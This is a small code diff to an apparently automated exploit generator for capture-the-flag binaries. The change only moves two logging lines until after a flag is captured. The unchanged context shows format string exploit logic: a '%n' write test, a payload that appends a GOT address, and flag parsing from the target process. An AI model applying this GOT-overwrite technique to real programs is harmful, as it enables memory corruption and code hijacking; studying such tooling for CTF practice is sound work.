@@ -676,10 +676,8 @@ class Raeg:
                 break
             p.close()
 
-        logger.info("First Controllable Offset Located at: " + str(offset))
 
         #Find Spaces written for offset
-        logger.info("Testing Which Offset to use in Format String...")
         spaces_written = 0
         test_str = '%' + str(value) + 'd%1$n'
 
@@ -709,8 +707,6 @@ class Raeg:
         #Convert to bytes and add vulnerable address in GOT
         self.format_string = bytes(format_string, 'utf-8') + p64(addr)
 
-        logger.info(f"Sending Format String: {self.format_string}")
-
 
         #Send exploit
         p = process(self.binary)
@@ -722,6 +718,8 @@ class Raeg:
             if 'flag' in data.decode():
                 self.flag = "flag{" + data.decode().replace(" ", "").replace("\n", "").split("{")[1].split("}")[0] + "}"
                 p.close()
+                logger.info("First Controllable Offset Located at: " + str(offset))
+                logger.info(f"Sending Format String: {self.format_string}")
                 return 1
         except:
             log.warning("Receive Failed...")
